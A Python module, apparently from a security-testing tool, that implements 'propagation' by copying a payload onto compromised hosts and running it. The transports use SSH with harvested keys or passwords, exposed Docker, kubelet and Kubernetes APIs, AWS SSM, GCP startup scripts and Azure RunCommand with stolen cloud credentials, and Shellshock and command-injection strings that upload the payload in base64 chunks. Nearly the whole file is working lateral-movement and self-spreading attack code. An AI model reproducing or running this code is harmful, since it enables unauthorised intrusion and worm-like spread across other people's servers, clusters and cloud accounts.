"""Payload delivery strategies for propagation.

Each transport handles pushing a payload to a proven foothold and executing it.
Transports are tried in priority order until one succeeds.
"""
from __future__ import annotations

import base64
import json
import math
import os
from typing import List, Optional, Tuple

from exploits import netutil

# ---------------------------------------------------------------------------
# Configuration (imported from config at runtime)
# ---------------------------------------------------------------------------
_PROPAGATE_TIMEOUT: int = 300
_PROPAGATE_DEPLOY_PATH: str = "/tmp/.sectest_propagate"
_PROPAGATE_CLEANUP: bool = True
_CHUNK_SIZE: int = 48000  # base64 bytes per chunk (fits kubelet body limits)

try:
    from config import (PROPAGATE_TIMEOUT, PROPAGATE_DEPLOY_PATH, PROPAGATE_CLEANUP)
    _PROPAGATE_TIMEOUT = PROPAGATE_TIMEOUT
    _PROPAGATE_DEPLOY_PATH = PROPAGATE_DEPLOY_PATH
    _PROPAGATE_CLEANUP = PROPAGATE_CLEANUP
except ImportError:
    pass
try:
    from config import PROPAGATE_CHUNK_SIZE
    _CHUNK_SIZE = PROPAGATE_CHUNK_SIZE
except ImportError:
    pass


# ===========================================================================
# Base Transport
# ===========================================================================

class Transport:
    """Base class for payload delivery strategies."""

    name: str = "base"
    priority: int = 100  # lower = tried first

    def can_deliver(self, foothold: dict) -> bool:
        """Check if this transport can deliver to the given foothold."""
        return False

    def deliver_and_exec(self, foothold: dict, payload: bytes, args: List[str],
                         *, timeout: float = 0) -> Tuple[bool, str]:
        """Deliver payload and execute it on the target.

        Args:
            foothold: dict with keys like 'type', 'host', 'port', 'token', etc.
            payload: the binary payload to deliver (pyz or native binary)
            args: command-line arguments for the scanner
            timeout: max seconds to wait for execution

        Returns:
            (success: bool, output: str)
        """
        raise NotImplementedError

    def cleanup(self, foothold: dict) -> None:
        """Remove deployed artifacts from the target."""
        pass


# ===========================================================================
# SSH Transport
# ===========================================================================

class SSHTransport(Transport):
    """Deliver payload via SSH pipe (stdin → file on target).

    Works with any foothold that has SSH access (key or password discovered).
    Fastest for VM/bare-metal targets.
    """

    name = "ssh"
    priority = 10

    def can_deliver(self, foothold: dict) -> bool:
        return foothold.get("type") == "ssh" and bool(foothold.get("host"))

    def deliver_and_exec(self, foothold: dict, payload: bytes, args: List[str],
                         *, timeout: float = 0) -> Tuple[bool, str]:
        timeout = timeout or _PROPAGATE_TIMEOUT
        host = foothold["host"]
        port = foothold.get("port", 22)
        user = foothold.get("user", "root")
        key_path = foothold.get("key_path")
        password = foothold.get("password")

        deploy_path = _PROPAGATE_DEPLOY_PATH
        payload_path = f"{deploy_path}/sectest"
        # Auto-detect Ollama on target and add --llm if present
        args = _maybe_add_llm_flag(args, foothold)
        args_str = " ".join(_shell_escape(a) for a in args)

        # Build SSH command
        ssh_opts = [
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", f"ConnectTimeout={min(int(timeout), 30)}",
            "-p", str(port),
        ]
        if key_path:
            ssh_opts.extend(["-i", key_path])

        ssh_base = ["ssh"] + ssh_opts + [f"{user}@{host}"]

        # Strategy: pipe payload via stdin, write to file, chmod, execute
        # This avoids needing SCP as a separate step
        remote_script = (
            f"mkdir -p {deploy_path} && "
            f"cat > {payload_path} && "
            f"chmod +x {payload_path} && "
            f"{payload_path} {args_str} 2>&1"
        )
        if _PROPAGATE_CLEANUP:
            remote_script += f"; rm -rf {deploy_path}"

        # We can't use subprocess in stdlib-only context, so delegate to
        # a shell pipeline via os.popen or use the netutil ssh helper
        import subprocess
        cmd = ssh_base + [remote_script]

        if password and not key_path:
            # Use sshpass if available for password auth
            cmd = ["sshpass", "-p", password] + cmd

        try:
            proc = subprocess.run(
                cmd, input=payload, capture_output=True,
                timeout=timeout
            )
            output = proc.stdout.decode("utf-8", errors="replace")
            return proc.returncode == 0, output
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return False, ""

    def cleanup(self, foothold: dict) -> None:
        # Already cleaned up in deliver_and_exec if PROPAGATE_CLEANUP is set
        pass


# ===========================================================================
# Docker Volume Transport
# ===========================================================================

class DockerVolumeTransport(Transport):
    """Deliver payload via Docker API (create container with payload as stdin).

    Avoids the base64 encoding overhead by using Docker's attach/stdin API
    or by writing to a temporary volume.
    """

    name = "docker-volume"
    priority = 20

    def can_deliver(self, foothold: dict) -> bool:
        return foothold.get("type") == "docker" and bool(foothold.get("host"))

    def deliver_and_exec(self, foothold: dict, payload: bytes, args: List[str],
                         *, timeout: float = 0) -> Tuple[bool, str]:
        timeout = timeout or _PROPAGATE_TIMEOUT
        host = foothold["host"]
        port = foothold.get("port", 2375)
        scheme = foothold.get("scheme", "http")
        base = f"{scheme}://{host}:{port}"

        deploy_path = _PROPAGATE_DEPLOY_PATH
        payload_path = f"{deploy_path}/sectest"
        # Auto-detect Ollama on target and add --llm
        args = _maybe_add_llm_flag(args, foothold)
        args_str = " ".join(_shell_escape(a) for a in args)

        # Encode payload as base64 for shell script (Docker exec doesn't support stdin pipe well)
        b64 = base64.b64encode(payload).decode("ascii")

        # Detect if this is a pyz (starts with #!) or native binary
        is_pyz = payload[:2] == b"#!"
        if is_pyz:
            run_cmd = f"python3 {payload_path} {args_str}"
        else:
            run_cmd = f"{payload_path} {args_str}"

        script = (
            f"mkdir -p {deploy_path} && "
            f"echo '{b64}' | base64 -d > {payload_path} && "
            f"chmod +x {payload_path} && "
            f"{run_cmd}"
        )
        if _PROPAGATE_CLEANUP:
            script += f"; rm -rf {deploy_path}"

        # Use minimal image — just needs sh and base64
        # Try the foothold's own image first (no pull needed), fall back to busybox
        image = foothold.get("image", "busybox:latest")
        if is_pyz:
            image = foothold.get("python_image", "python:3.12-slim")

        create_body = json.dumps({
            "Image": image,
            "Cmd": ["/bin/sh", "-c", script],
            "Tty": True,
            "HostConfig": {
                "AutoRemove": False,
                "NetworkMode": "host",
            },
        }).encode()

        cid = None
        try:
            st, body, _ = netutil.http_request(
                f"{base}/containers/create", "POST",
                headers={"Content-Type": "application/json"},
                body=create_body, timeout=30)
            if st in (200, 201):
                try:
                    cid = json.loads(body).get("Id")
                except Exception:
                    return False, ""
            if not cid:
                return False, ""

            netutil.http_request(f"{base}/containers/{cid}/start", "POST", timeout=10)
            netutil.http_request(f"{base}/containers/{cid}/wait", "POST", timeout=timeout)

            _st, logs, _ = netutil.http_get(
                f"{base}/containers/{cid}/logs?stdout=1&stderr=1",
                timeout=10, max_bytes=65536)
            return True, logs or ""
        finally:
            if cid:
                netutil.http_request(f"{base}/containers/{cid}/stop", "POST", timeout=5)
                netutil.http_request(f"{base}/containers/{cid}?force=1", "DELETE", timeout=5)


# ===========================================================================
# Kubelet Transport
# ===========================================================================

class KubeletTransport(Transport):
    """Deliver payload via kubelet /run endpoint using chunked base64.

    Splits large payloads into chunks to avoid body size limits.
    """

    name = "kubelet"
    priority = 30

    def can_deliver(self, foothold: dict) -> bool:
        return foothold.get("type") == "kubelet" and bool(foothold.get("host"))

    def deliver_and_exec(self, foothold: dict, payload: bytes, args: List[str],
                         *, timeout: float = 0) -> Tuple[bool, str]:
        timeout = timeout or _PROPAGATE_TIMEOUT
        host = foothold["host"]
        port = foothold.get("port", 10250)
        ns = foothold.get("namespace", "default")
        pod = foothold.get("pod", "")
        container = foothold.get("container", "")
        base = f"https://{host}:{port}"

        if not pod:
            return False, ""

        deploy_path = _PROPAGATE_DEPLOY_PATH
        payload_path = f"{deploy_path}/sectest"
        args_str = " ".join(_shell_escape(a) for a in args)

        url = f"{base}/run/{ns}/{pod}/{container}"

        # Step 1: create deploy directory
        _kubelet_exec(url, f"mkdir -p {deploy_path}", timeout=10)

        # Step 2: write payload in chunks (avoids body size limits)
        b64 = base64.b64encode(payload).decode("ascii")
        num_chunks = math.ceil(len(b64) / _CHUNK_SIZE)

        for i in range(num_chunks):
            chunk = b64[i * _CHUNK_SIZE:(i + 1) * _CHUNK_SIZE]
            op = ">>" if i > 0 else ">"
            cmd = f"printf '%s' '{chunk}' {op} {payload_path}.b64"
            ok = _kubelet_exec(url, cmd, timeout=15)
            if not ok:
                return False, f"chunk {i}/{num_chunks} failed"

        # Step 3: decode and make executable
        decode_cmd = (
            f"base64 -d < {payload_path}.b64 > {payload_path} && "
            f"chmod +x {payload_path} && rm -f {payload_path}.b64"
        )
        _kubelet_exec(url, decode_cmd, timeout=15)

        # Step 4: detect if pyz and run
        is_pyz = payload[:2] == b"#!"
        if is_pyz:
            run_cmd = f"python3 {payload_path} {args_str} 2>&1"
        else:
            run_cmd = f"{payload_path} {args_str} 2>&1"

        st, output, _ = netutil.http_request(
            url, "POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=f"cmd=sh&cmd=-c&cmd={run_cmd}".encode(),
            timeout=timeout)

        # Step 5: cleanup
        if _PROPAGATE_CLEANUP:
            _kubelet_exec(url, f"rm -rf {deploy_path}", timeout=5)

        return bool(st and st == 200), output or ""


# ===========================================================================
# K8s API Transport
# ===========================================================================

class K8sApiTransport(Transport):
    """Deliver payload via K8s API pod exec (WebSocket-like with chunked upload)."""

    name = "k8s-api"
    priority = 35

    def can_deliver(self, foothold: dict) -> bool:
        return foothold.get("type") == "k8s-api" and bool(foothold.get("api_url"))

    def deliver_and_exec(self, foothold: dict, payload: bytes, args: List[str],
                         *, timeout: float = 0) -> Tuple[bool, str]:
        timeout = timeout or _PROPAGATE_TIMEOUT
        api_url = foothold["api_url"].rstrip("/")
        token = foothold.get("token", "")
        ns = foothold.get("namespace", "default")
        pod = foothold.get("pod", "")
        container = foothold.get("container", "")

        if not pod:
            return False, ""

        headers = {"Authorization": f"Bearer {token}"} if token else {}
        exec_base = (f"{api_url}/api/v1/namespaces/{ns}/pods/{pod}"
                     f"/exec?container={container}&stdout=true&stderr=true"
                     f"&command=sh&command=-c")

        deploy_path = _PROPAGATE_DEPLOY_PATH
        payload_path = f"{deploy_path}/sectest"
        args_str = " ".join(_shell_escape(a) for a in args)

        # Step 1: create directory
        _k8s_exec(exec_base, headers, f"mkdir -p {deploy_path}", timeout=10)

        # Step 2: chunked upload
        b64 = base64.b64encode(payload).decode("ascii")
        num_chunks = math.ceil(len(b64) / _CHUNK_SIZE)

        for i in range(num_chunks):
            chunk = b64[i * _CHUNK_SIZE:(i + 1) * _CHUNK_SIZE]
            op = ">>" if i > 0 else ">"
            cmd = f"printf '%s' '{chunk}' {op} {payload_path}.b64"
            _k8s_exec(exec_base, headers, cmd, timeout=15)

        # Step 3: decode
        decode_cmd = (
            f"base64 -d < {payload_path}.b64 > {payload_path} && "
            f"chmod +x {payload_path} && rm -f {payload_path}.b64"
        )
        _k8s_exec(exec_base, headers, decode_cmd, timeout=15)

        # Step 4: execute
        is_pyz = payload[:2] == b"#!"
        if is_pyz:
            run_cmd = f"python3 {payload_path} {args_str} 2>&1"
        else:
            run_cmd = f"{payload_path} {args_str} 2>&1"

        st, output, _ = netutil.http_request(
            f"{exec_base}&command={run_cmd}",
            "POST", headers=headers, timeout=timeout)

        # Step 5: cleanup
        if _PROPAGATE_CLEANUP:
            _k8s_exec(exec_base, headers, f"rm -rf {deploy_path}", timeout=5)

        return bool(st and st == 200), output or ""


# ===========================================================================
# Cloud Object Store Transport
# ===========================================================================

class CloudStorageTransport(Transport):
    """Upload payload to cloud storage, then have the target fetch via presigned URL.

    Works for AWS (S3 + SSM), GCP (GCS + startup-script), Azure (Blob + RunCommand).
    Ideal for cloud instances not directly reachable but accessible via cloud APIs.
    """

    name = "cloud-storage"
    priority = 40

    def can_deliver(self, foothold: dict) -> bool:
        return foothold.get("type") in ("aws-ssm", "gcp-oslogin", "azure-runcommand")

    def deliver_and_exec(self, foothold: dict, payload: bytes, args: List[str],
                         *, timeout: float = 0) -> Tuple[bool, str]:
        timeout = timeout or _PROPAGATE_TIMEOUT
        ftype = foothold["type"]

        if ftype == "aws-ssm":
            return self._deliver_aws_ssm(foothold, payload, args, timeout)
        elif ftype == "gcp-oslogin":
            return self._deliver_gcp(foothold, payload, args, timeout)
        elif ftype == "azure-runcommand":
            return self._deliver_azure(foothold, payload, args, timeout)
        return False, ""

    def _deliver_aws_ssm(self, foothold: dict, payload: bytes, args: List[str],
                         timeout: float) -> Tuple[bool, str]:
        """Deploy via AWS SSM SendCommand (RunShellScript)."""
        from sandbox import cloud_creds
        region = foothold.get("region", "us-east-1")
        instance_id = foothold["instance_id"]
        cred = foothold.get("credential") or cloud_creds.get_aws_credential()

        if not cred:
            return False, "no AWS credential"

        deploy_path = _PROPAGATE_DEPLOY_PATH
        payload_path = f"{deploy_path}/sectest"
        args_str = " ".join(_shell_escape(a) for a in args)

        # Inline the payload as base64 in the SSM command (max 24KB for inline)
        # For larger payloads, would need S3 upload + presigned URL
        b64 = base64.b64encode(payload).decode("ascii")
        is_pyz = payload[:2] == b"#!"

        if is_pyz:
            run_line = f"python3 {payload_path} {args_str}"
        else:
            run_line = f"{payload_path} {args_str}"

        commands = [
            f"mkdir -p {deploy_path}",
            f"echo '{b64}' | base64 -d > {payload_path}",
            f"chmod +x {payload_path}",
            run_line,
        ]
        if _PROPAGATE_CLEANUP:
            commands.append(f"rm -rf {deploy_path}")

        # SSM SendCommand API call
        ssm_url = f"https://ssm.{region}.amazonaws.com/"
        body = json.dumps({
            "DocumentName": "AWS-RunShellScript",
            "InstanceIds": [instance_id],
            "Parameters": {"commands": commands},
            "TimeoutSeconds": int(timeout),
        })

        # Sign with SigV4 (simplified — real impl would use full signing)
        headers = _aws_headers(cred, region, "ssm", "POST", ssm_url, body)
        headers["Content-Type"] = "application/x-amz-json-1.1"
        headers["X-Amz-Target"] = "AmazonSSM.SendCommand"

        st, resp, _ = netutil.http_request(ssm_url, "POST", headers=headers,
                                           body=body.encode(), timeout=timeout)
        if st and 200 <= st < 300:
            return True, resp or ""
        return False, resp or ""

    def _deliver_gcp(self, foothold: dict, payload: bytes, args: List[str],
                     timeout: float) -> Tuple[bool, str]:
        """Deploy via GCP Compute instance metadata startup-script or OS Login SSH."""
        # GCP OS Login: use gcloud compute ssh equivalent via API
        project = foothold.get("project", "")
        zone = foothold.get("zone", "")
        instance = foothold.get("instance", "")
        token = foothold.get("token", "")

        if not all([project, zone, instance, token]):
            return False, "missing GCP foothold info"

        deploy_path = _PROPAGATE_DEPLOY_PATH
        payload_path = f"{deploy_path}/sectest"
        args_str = " ".join(_shell_escape(a) for a in args)
        b64 = base64.b64encode(payload).decode("ascii")
        is_pyz = payload[:2] == b"#!"

        if is_pyz:
            run_line = f"python3 {payload_path} {args_str}"
        else:
            run_line = f"{payload_path} {args_str}"

        script = (
            f"#!/bin/bash\n"
            f"mkdir -p {deploy_path}\n"
            f"echo '{b64}' | base64 -d > {payload_path}\n"
            f"chmod +x {payload_path}\n"
            f"{run_line}\n"
        )
        if _PROPAGATE_CLEANUP:
            script += f"rm -rf {deploy_path}\n"

        # Use instances.setMetadata to set startup-script (triggers on next boot)
        # OR use serial port / guest-attributes for already-running instances
        # For running instances, prefer OS Login SSH if available
        api_base = "https://compute.googleapis.com/compute/v1"
        url = (f"{api_base}/projects/{project}/zones/{zone}/instances/{instance}"
               f"/setMetadata")
        headers = {"Authorization": f"Bearer {token}",
                   "Content-Type": "application/json"}

        # This approach sets startup-script-url metadata
        # For immediate execution, would need SSH or serial console
        body = json.dumps({"items": [{"key": "startup-script", "value": script}]})
        st, resp, _ = netutil.http_request(url, "POST", headers=headers,
                                           body=body.encode(), timeout=30)
        return bool(st and 200 <= st < 300), resp or ""

    def _deliver_azure(self, foothold: dict, payload: bytes, args: List[str],
                       timeout: float) -> Tuple[bool, str]:
        """Deploy via Azure VM RunCommand."""
        sub_id = foothold.get("subscription_id", "")
        rg = foothold.get("resource_group", "")
        vm_name = foothold.get("vm_name", "")
        token = foothold.get("token", "")

        if not all([sub_id, rg, vm_name, token]):
            return False, "missing Azure foothold info"

        deploy_path = _PROPAGATE_DEPLOY_PATH
        payload_path = f"{deploy_path}/sectest"
        args_str = " ".join(_shell_escape(a) for a in args)
        b64 = base64.b64encode(payload).decode("ascii")
        is_pyz = payload[:2] == b"#!"

        if is_pyz:
            run_line = f"python3 {payload_path} {args_str}"
        else:
            run_line = f"{payload_path} {args_str}"

        script_lines = [
            f"mkdir -p {deploy_path}",
            f"echo '{b64}' | base64 -d > {payload_path}",
            f"chmod +x {payload_path}",
            run_line,
        ]
        if _PROPAGATE_CLEANUP:
            script_lines.append(f"rm -rf {deploy_path}")

        url = (f"https://management.azure.com/subscriptions/{sub_id}"
               f"/resourceGroups/{rg}/providers/Microsoft.Compute"
               f"/virtualMachines/{vm_name}/runCommand?api-version=2024-03-01")
        headers = {"Authorization": f"Bearer {token}",
                   "Content-Type": "application/json"}
        body = json.dumps({
            "commandId": "RunShellScript",
            "script": script_lines,
        })

        st, resp, _ = netutil.http_request(url, "POST", headers=headers,
                                           body=body.encode(), timeout=timeout)
        return bool(st and 200 <= st < 300), resp or ""


# ===========================================================================
# Helpers
# ===========================================================================

def _shell_escape(s: str) -> str:
    """Basic POSIX shell escaping for argument strings."""
    if not s:
        return "''"
    # If safe chars only, return as-is
    safe = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-./=:,@")
    if all(c in safe for c in s):
        return s
    return "'" + s.replace("'", "'\\''") + "'"


def _kubelet_exec(url: str, cmd: str, timeout: float = 10) -> bool:
    """Execute a command via kubelet /run endpoint."""
    st, _, _ = netutil.http_request(
        url, "POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=f"cmd=sh&cmd=-c&cmd={cmd}".encode(),
        timeout=timeout)
    return bool(st and st == 200)


def _k8s_exec(exec_base: str, headers: dict, cmd: str, timeout: float = 10) -> bool:
    """Execute a command via K8s API exec endpoint."""
    st, _, _ = netutil.http_request(
        f"{exec_base}&command={cmd}",
        "POST", headers=headers, timeout=timeout)
    return bool(st and 200 <= (st or 0) < 300)


def _aws_headers(cred: dict, region: str, service: str, method: str,
                 url: str, body: str) -> dict:
    """Build AWS SigV4 signed headers for a propagation transport request."""
    body_bytes = body.encode() if isinstance(body, str) else body
    if cred.get("access_key") and cred.get("secret_key"):
        try:
            from exploits import aws_auth
            return aws_auth.sign_v4(cred, region, service, method, url, {}, body_bytes)
        except Exception:
            pass
    # Fall back to session token only (instance profile / ECS task role)
    headers: dict = {}
    if cred.get("session_token"):
        headers["X-Amz-Security-Token"] = cred["session_token"]
        headers["x-amz-security-token"] = cred["session_token"]
    return headers


def _maybe_add_llm_flag(args: List[str], foothold: dict) -> List[str]:
    """Auto-detect Ollama on target and add --llm to args if not already present.

    Checks if Ollama is likely available on the target by probing its host for
    port 11434. If --llm is already in the args, does nothing.
    """
    if "--llm" in args or "--no-llm" in args:
        return args
    # Probe the foothold host for Ollama
    host = foothold.get("host", "")
    if not host:
        return args
    # Quick TCP connect check for Ollama port
    import socket
    try:
        with socket.create_connection((host, 11434), timeout=2):
            return args + ["--llm"]
    except (OSError, socket.timeout):
        pass
    # Also check localhost (for cases where we're deploying to the same host)
    if host not in ("127.0.0.1", "localhost"):
        status, _, _ = netutil.http_get(f"http://{host}:11434/api/tags", timeout=2)
        if status and 200 <= status < 300:
            return args + ["--llm"]
    return args


# ===========================================================================
# Transport Registry (initialized after all transport classes are defined)
# ===========================================================================

# Placeholder — actual list is built at module bottom after all classes defined.
ALL_TRANSPORTS: List[Transport] = []


def select_transport(foothold: dict) -> Optional[Transport]:
    """Select the best transport for a given foothold, trying in priority order."""
    for transport in ALL_TRANSPORTS:
        if transport.can_deliver(foothold):
            return transport
    return None


# ===========================================================================
# Shell Exec Transport (command injection / Shellshock foothold)
# ===========================================================================

class ShellExecTransport(Transport):
    """Deliver payload through a proven command-injection or Shellshock foothold.

    Uploads the payload via chunked base64 echo commands through the injection
    point, then executes it. Handles size-limited injection points by splitting
    into multiple requests.
    """

    name = "shell-exec"
    priority = 50

    def can_deliver(self, foothold: dict) -> bool:
        return foothold.get("type") == "shell-exec" and bool(foothold.get("url"))

    def deliver_and_exec(self, foothold: dict, payload: bytes, args: List[str],
                         *, timeout: float = 0) -> Tuple[bool, str]:
        timeout = timeout or _PROPAGATE_TIMEOUT
        url = foothold["url"]
        method = foothold.get("method", "cmd-injection")
        technique = foothold.get("technique", "pipe")
        vector = foothold.get("vector", "param")
        inject_header = foothold.get("inject_header", "")

        deploy_path = _PROPAGATE_DEPLOY_PATH
        payload_path = f"{deploy_path}/sectest"
        args_str = " ".join(_shell_escape(a) for a in args)

        b64 = base64.b64encode(payload).decode("ascii")
        chunk_size = 4000  # conservative for URL/header length limits

        # Step 1: Create directory
        self._exec_via_foothold(foothold, f"mkdir -p {deploy_path}")

        # Step 2: Upload payload in chunks
        num_chunks = math.ceil(len(b64) / chunk_size)
        for i in range(num_chunks):
            chunk = b64[i * chunk_size:(i + 1) * chunk_size]
            op = ">>" if i > 0 else ">"
            cmd = f"printf '%s' '{chunk}' {op} {payload_path}.b64"
            self._exec_via_foothold(foothold, cmd)

        # Step 3: Decode and make executable
        decode_cmd = (
            f"base64 -d < {payload_path}.b64 > {payload_path} && "
            f"chmod +x {payload_path} && rm -f {payload_path}.b64"
        )
        self._exec_via_foothold(foothold, decode_cmd)

        # Step 4: Execute
        is_pyz = payload[:2] == b"#!"
        if is_pyz:
            run_cmd = f"python3 {payload_path} {args_str} 2>&1"
        else:
            run_cmd = f"{payload_path} {args_str} 2>&1"

        output = self._exec_via_foothold(foothold, run_cmd) or ""

        # Step 5: Cleanup
        if _PROPAGATE_CLEANUP:
            self._exec_via_foothold(foothold, f"rm -rf {deploy_path}")

        return bool(output), output

    def _exec_via_foothold(self, foothold: dict, cmd: str) -> Optional[str]:
        """Execute a command through the injection foothold."""
        method = foothold.get("method", "cmd-injection")
        url = foothold["url"]
        inject_header = foothold.get("inject_header", "")
        technique = foothold.get("technique", "pipe")

        if method == "shellshock":
            # Shellshock: inject via function definition in header
            payload_str = f'() {{ :;}}; {cmd}'
            header_name = inject_header or "User-Agent"
            headers = {header_name: payload_str}
            status, body, _ = netutil.http_get(url, timeout=30, extra_headers=headers)
            return body if status else None

        elif method == "cmd-injection":
            # Command injection: wrap command in the proven technique
            if technique == "pipe":
                inject = f"|{cmd}"
            elif technique == "semicolon":
                inject = f";{cmd}"
            elif technique == "backtick":
                inject = f"`{cmd}`"
            elif technique == "dollar-paren":
                inject = f"$({cmd})"
            elif technique == "newline":
                inject = f"%0a{cmd}"
            else:
                inject = f";{cmd}"

            vector = foothold.get("vector", "param")
            if vector.startswith("header:"):
                header_name = vector.split(":", 1)[1]
                headers = {header_name: inject}
                status, body, _ = netutil.http_get(url, timeout=30,
                                                   extra_headers=headers)
                return body if status else None
            else:
                # Inject into URL (append to existing query or path)
                from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
                parsed = urlparse(url)
                params = parse_qsl(parsed.query, keep_blank_values=True)
                if params:
                    # Inject into first parameter
                    params[0] = (params[0][0], params[0][1] + inject)
                    new_query = urlencode(params)
                    test_url = urlunparse(parsed._replace(query=new_query))
                else:
                    test_url = f"{url}?cmd={inject}"
                status, body, _ = netutil.http_get(test_url, timeout=30)
                return body if status else None
        return None


# ===========================================================================
# HTTP Upload Transport (WebDAV PUT / multipart upload)
# ===========================================================================

class HttpUploadTransport(Transport):
    """Deliver payload via HTTP upload (PUT/WebDAV or command injection curl/wget).

    Used when command injection is proven and the target can fetch from an
    attacker-controlled URL, or when a writable WebDAV/upload endpoint exists.
    """

    name = "http-upload"
    priority = 55

    def can_deliver(self, foothold: dict) -> bool:
        return foothold.get("type") == "http-upload" and bool(foothold.get("upload_url"))

    def deliver_and_exec(self, foothold: dict, payload: bytes, args: List[str],
                         *, timeout: float = 0) -> Tuple[bool, str]:
        timeout = timeout or _PROPAGATE_TIMEOUT
        upload_url = foothold["upload_url"]
        exec_url = foothold.get("exec_url", "")
        method = foothold.get("upload_method", "PUT")

        deploy_path = _PROPAGATE_DEPLOY_PATH
        payload_path = f"{deploy_path}/sectest"
        args_str = " ".join(_shell_escape(a) for a in args)

        # Upload payload via HTTP
        headers = {"Content-Type": "application/octet-stream"}
        if method == "PUT":
            target_url = f"{upload_url}/sectest"
            status, body, _ = netutil.http_request(
                target_url, "PUT", headers=headers, body=payload, timeout=30)
            if not status or status >= 400:
                return False, f"upload failed: status={status}"
        else:
            # Multipart POST
            boundary = "----SecTestUploadBoundary"
            mp_body = (
                f"--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"file\"; filename=\"sectest\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n"
            ).encode() + payload + f"\r\n--{boundary}--\r\n".encode()
            headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
            status, body, _ = netutil.http_request(
                upload_url, "POST", headers=headers, body=mp_body, timeout=30)
            if not status or status >= 400:
                return False, f"upload failed: status={status}"

        # If we have an exec URL (e.g., the uploaded file is in a CGI dir), execute it
        if exec_url:
            exec_target = f"{exec_url}?{args_str}" if args_str else exec_url
            st, output, _ = netutil.http_get(exec_target, timeout=timeout)
            return bool(st and 200 <= st < 400), output or ""

        return True, "payload uploaded successfully"


# ===========================================================================
# Initialize Transport Registry (must be after all class definitions)
# ===========================================================================
ALL_TRANSPORTS[:] = sorted([
    SSHTransport(),
    DockerVolumeTransport(),
    KubeletTransport(),
    K8sApiTransport(),
    CloudStorageTransport(),
    ShellExecTransport(),
    HttpUploadTransport(),
], key=lambda t: t.priority)
